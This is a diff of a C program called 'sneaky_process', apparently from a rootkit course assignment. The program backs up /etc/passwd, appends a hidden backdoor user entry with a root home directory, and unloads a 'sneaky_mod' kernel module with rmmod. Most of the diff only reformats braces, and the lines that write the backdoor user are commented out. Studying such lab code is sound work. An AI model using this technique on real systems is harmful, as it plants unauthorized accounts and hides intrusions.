@@ -11,26 +11,29 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-int main() {
+int main()
+{
   // Step 1
   int pid = getpid();
   printf("sneaky_process pid = %d\n", pid);
 
   // Step 2
-  FILE* readFile = fopen("/etc/passwd", "a+");
-  FILE* writeFile = fopen("/tmp/passwd", "w");
-  if (readFile == NULL || writeFile == NULL) {
+  FILE *readFile = fopen("/etc/passwd", "a+");
+  FILE *writeFile = fopen("/tmp/passwd", "w");
+  if (readFile == NULL || writeFile == NULL)
+  {
     perror("Fail to open target file");
     return EXIT_FAILURE;
   }
   // Copy content into /tmp/passwd from /etc/passwd
   char content;
-  while ((content = fgetc(readFile)) != EOF) {
+  while ((content = fgetc(readFile)) != EOF)
+  {
     fputc(content, writeFile);
   }
   // Add sneaky user into /etc/passwd
-  char* sneakyuser = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
-  fputs(sneakyuser, readFile);
+  //char* sneakyuser = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
+  //fputs(sneakyuser, readFile);
   // Close open files
   fclose(readFile);
   fclose(writeFile);
@@ -44,23 +47,26 @@ int main() {
   // Step 4
   printf("start loop\n");
   char loop;
-  while ((loop = fgetc(stdin)) != 'q') {
+  while ((loop = fgetc(stdin)) != 'q')
+  {
     continue;
   }
 
   // Step 5
-  char* unload = "rmmod sneaky_mod";
+  char *unload = "rmmod sneaky_mod";
   system(unload);
 
   // Step 6
-  FILE* restore = fopen("/etc/passwd", "w");
-  FILE* src = fopen("/tmp/passwd", "r");
-  if (restore == NULL || src == NULL) {
+  FILE *restore = fopen("/etc/passwd", "w");
+  FILE *src = fopen("/tmp/passwd", "r");
+  if (restore == NULL || src == NULL)
+  {
     perror("Fail to open target file");
     return EXIT_FAILURE;
   }
   // Restore /etc/passwd from /tmp/passwd
-  while ((content = fgetc(src)) != EOF) {
+  while ((content = fgetc(src)) != EOF)
+  {
     fputc(content, restore);
   }
 
@@ -68,5 +74,4 @@ int main() {
   fclose(src);
 
   return EXIT_SUCCESS;
-
 }
